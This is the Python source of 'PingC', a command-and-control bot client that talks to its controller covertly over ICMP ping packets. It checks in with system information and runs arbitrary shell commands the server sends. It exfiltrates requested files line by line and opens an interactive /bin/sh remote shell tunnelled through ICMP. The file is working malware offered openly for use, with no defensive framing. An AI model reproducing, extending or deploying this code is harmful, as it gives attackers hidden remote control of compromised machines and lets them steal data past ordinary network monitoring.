#! /usr/bin/env python

# PingC ICMP command and control client application
# by NoCow
# This is the client side application for my ICMP C2 project. The client will periodically ping the C2 server
#  and receive commands in the data portion of the reply. I am currently using Scapy for the packet building
# Usage: ./pingc.py <IP>

import fileinput
import sys
import time
import signal
import subprocess as sub
from ConfigParser import SafeConfigParser
from scapy.all import *
import select
from impacket import ImpactDecoder
from impacket import ImpactPacket



def pingshell(dst):
	#print "[D] Dst: %s" % dst
	s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
	s.setblocking(0)
	s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
	print "[*] Socket created"
	
	ip = ImpactPacket.IP()
	ip.set_ip_dst(dst)

	# Create a new ICMP packet of type ECHO
	icmp = ImpactPacket.ICMP()
	icmp.set_icmp_type(icmp.ICMP_ECHO)
	response = "#"
	print "[D] Response: %s" % response 
	# Include the command as data inside the ICMP packet
	icmp.contains(ImpactPacket.Data(response))

	# Calculate its checksum
	icmp.set_icmp_cksum(0)
	icmp.auto_checksum = 1

	# Have the IP packet contain the ICMP packet (along with its payload)
	ip.contains(icmp)

	# Send it to the target host
	s.sendto(ip.get_packet(), (dst, 0))

	decoder = ImpactDecoder.IPDecoder()

	cmd = ''
	count = 0
	while 1:
		# Wait for incoming replies
		if s in select.select([ s ], [], [], 15)[0]:
			print "[*] Packet received from %s" % dst
			buff = s.recv(4096)

        		if 0 == len(buff):
           			# Socket remotely closed
           			s.close()
           			return

        		# Packet received; decode and display it
        		ippacket = decoder.decode(buff)
        		icmppacket = ippacket.child()
        		# If the packet matches, report it to the user
        		# Get identifier and sequence number
        		data = icmppacket.get_data_as_string()
			if len(data) > 0:
        			if data != '\n':
					print "[D] Data: %s" % str(data)
					if data.split('\n')[0] == 'exit':
                                		s.close()
						return
					# Parse command from standard input
					try:
                				shell_proc=sub.Popen(["/bin/sh", "-i"],shell=True,stdin=sub.PIPE,stdout=sub.PIPE,stderr=sub.PIPE)
        				except Exception, e:
                				print "[X] ERROR: %s" % str(e)
					
					try:
						response = shell_proc.communicate(data)[0]
						print "[D] Response: %s" % response
					except Exception,e:
						print "[X] Error reading response"
						response = 'error\n'
					response = response + '#'
					print "[D] Response: %s" % response
				else:
					response = '#'
        		
			if len(response) > 1432:
				chunks, chunk_size = len(response), len(response)/1432
				print "[D] Chunks: %s, chunk_size: %s" % (chunks, chunk_size)
				for i in range(0, chunks, chunk_size):
					print "[D] Response[%s]: %s" % (i,str(response[i:i+chunk_size]))
			
					# Include the command as data inside the ICMP packet
					icmp.contains(ImpactPacket.Data(str(response[i:i+chunk_size])))

        				# Calculate its checksum
        				icmp.set_icmp_cksum(0)
        				icmp.auto_checksum = 1

        				# Have the IP packet contain the ICMP packet (along with its payload)
        				ip.contains(icmp)

        				# Send it to the target host
        				s.sendto(ip.get_packet(), (dst, 0))
					print "[D] Packet sent: %s" % response
			else:
				# Include the command as data inside the ICMP packet
                                icmp.contains(ImpactPacket.Data(response))

                                # Calculate its checksum
                                icmp.set_icmp_cksum(0)
                                icmp.auto_checksum = 1

                                # Have the IP packet contain the ICMP packet (along with its payload)
                                ip.contains(icmp)

                                # Send it to the target host
                                s.sendto(ip.get_packet(), (dst, 0))
                                print "[D] Packet sent: %s" % response
		else:
			print "[*] Select timeout hit, resending empty prompt"
			count = count + 1
			if count == 9:
				print "[X] Session lost, disconnecting"
				return
			ip = ImpactPacket.IP()
        
        		ip.set_ip_dst(dst)
        
        		# Create a new ICMP packet of type ECHO
        		icmp = ImpactPacket.ICMP()
        		icmp.set_icmp_type(icmp.ICMP_ECHO)
        		prompt = '#'
        		# Include the command as data inside the ICMP packet
        		icmp.contains(ImpactPacket.Data(prompt))
        
        		# Calculate its checksum
        		icmp.set_icmp_cksum(0)
        		icmp.auto_checksum = 1
        
        		# Have the IP packet contain the ICMP packet (along with its payload)
        		ip.contains(icmp)
        
        		# Send it to the target host
        		s.sendto(ip.get_packet(), (dst, 0))
	print "[*] Socket closed and returning"


def getSleep():
	conf_file = 'conf/pingc.conf'
	cp = SafeConfigParser()
        cp.optionxform = str # Preserves case sensitivity
        cp.readfp(open(conf_file, 'r'))
        section = 'Main'
        sleep = cp.get(section,'sleep')
	print "[*] Sleeping for %s seconds" % sleep
	time.sleep(int(sleep))
	return	

def setSleep(sleep):
	conf_file = 'conf/pingc.conf'
	cp = SafeConfigParser()
        cp.optionxform = str # Preserves case sensitivity
        cp.readfp(open(conf_file, 'r'))
        section = 'Main'
        options = {'sleep': sleep}
        for option, value in options.items():
                cp.set(section, option, value)
        cp.write(open(conf_file, 'w'))


def getId():
	conf_file = 'conf/pingc.conf'
	#print "[D] Getting bot Id"
	cp = SafeConfigParser()
        cp.optionxform = str # Preserves case sensitivity
        cp.readfp(open(conf_file, 'r'))
        section = 'Main'
        id = cp.get(section,'id')
	#print "[D] ID found: %s" % id
	return id	

def setId(botId):
	conf_file = 'conf/pingc.conf'
	#print "[D] Writing bot Id: ",botId
	cp = SafeConfigParser()
        cp.optionxform = str # Preserves case sensitivity
        cp.readfp(open(conf_file, 'r'))
        section = 'Main'
        options = {'checkedin': '1',
               'id': botId}
        for option, value in options.items():
                cp.set(section, option, value)
        cp.write(open(conf_file, 'w'))

def active():
	conf_file = 'conf/pingc.conf'
	cp = SafeConfigParser()
        cp.optionxform = str # Preserves case sensitivity
        cp.readfp(open(conf_file, 'r'))
        section = 'Main'
        return cp.get(section,'checkedin')

def handler(signum, frame):
        print 'Bye!'
        sys.exit()

def sendFile(filename,botId):
	print "[*] Sending file: %s" % filename
	try:
		file = open(filename, 'r')
	except Exception, e:
		print "[X] File error: %s" % str(e)
		return
	startLine = '(FILE_START) ' + botId + ' ' + str(filename)
	print "[D] Startline: %s" % startLine
	packet=IP(dst=sys.argv[1])/ICMP()/startLine
	p=sr1(packet,timeout=1)
	for line in file:
		#print "[D] Sending line: %s" % line
		sendLine = '(FILE) ' + botId + ' ' + filename + ' ' + line
		packet=IP(dst=sys.argv[1])/ICMP()/sendLine
		#send(packet)
		#time.sleep(1)
		p=sr1(packet,timeout=1)
	print "[D] End of file"
	finishLine = '(FILE_END) ' + botId + ' ' + str(filename)
	packet=IP(dst=sys.argv[1])/ICMP()/finishLine
	send(packet)

	
def sendPingRequest(request,botId):
	full_request = request + ' ' + str(botId)
	if botId == '123456789':
		# Initial Checkin request
		packet=IP(dst=sys.argv[1])/ICMP()/str(request)
	else:
		packet=IP(dst=sys.argv[1])/ICMP()/str(full_request)
        #packet.show()
        print "[*] Request sent to C2 server: " + request
	try:
		p=sr1(packet,timeout=10)
		#p.show()
		if p:
                	return p
        	else:
                	return
        except:
		print "[X] Error receiving packet"

def processReply(p):
	try:
		response=p['Raw'].load
        except:
		print "[X] Error: ", sys.exc_info()[0]
		return
	# Check ICMP data for 'run' command
        print "[*] String received from C2 server: " + p['Raw'].load
        if 'run' in response:
        	print "[*] Master says run command: " + response[4:]
                command = response[4:]
                command.split()
                proc = sub.Popen(command,stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                output, errors = proc.communicate()
		print output
                print errors
	elif 'sysinfo' in response:
        	print "[*] Master requesting sysinfo"
		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                output, errors = proc.communicate()
                botId=getId()
		sendRequest = 'sysinfo %s %s' % (botId,output)
		p=sendPingRequest(sendRequest, botId)
		if p:	
			processReply(p)
		#print output
                print errors
	elif 'Thanks' in response:
		print "[*] Thanks received"
		print "[*] Sleeping for 10"
		time.sleep(10)
        elif 'get' in response:
		print "[*] Master says give him %s" % response[4:]
		botId=getId()
		print "[D] filesSent: %s" % str(filesSent)
		if response[4:] not in filesSent:
			sendFile(response[4:], botId)
			filesSent.append(response[4:])
		else:
			print "[*] File already sent...skipping"
		 
	elif 'sleep' in response:
		seconds = response[6:]
                print "[*] Master says sleep for %s seconds" % (seconds)
                print "[*] Sleeping..."
                setSleep(seconds)
	elif 'id=' in response:
		print "[*] Checked in...placing id in conf file"
		setId(response[3:])
	elif 'shell' in response:
		print "[*] Master wants shell, master gets shell"
		time.sleep(10)
		pingshell(sys.argv[1])

def main(argv):
	global filesSent
	filesSent = []
	if int(active()) != 1:
		print "[*] Not checked in...checking in now"
		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                output, errors = proc.communicate()
                p=sendPingRequest('Checkin %s' % output,'123456789')
                if p:
                        processReply(p)
                #print output
                print errors
		#print "[D] id==null"
	while True:
		if len(argv) < 1:
			print "----------------------------"
			print "PingC Usage"
			print " ./pingc.py <IP>"
			print "----------------------------"
			exit()
		signal.signal(signal.SIGINT, handler)
		id = getId()
		sendStr="What shall I do master?"
		p=sendPingRequest(sendStr, id)
		if p:
			processReply(p)
		getSleep()

if __name__ == "__main__":
   main(sys.argv[1:])

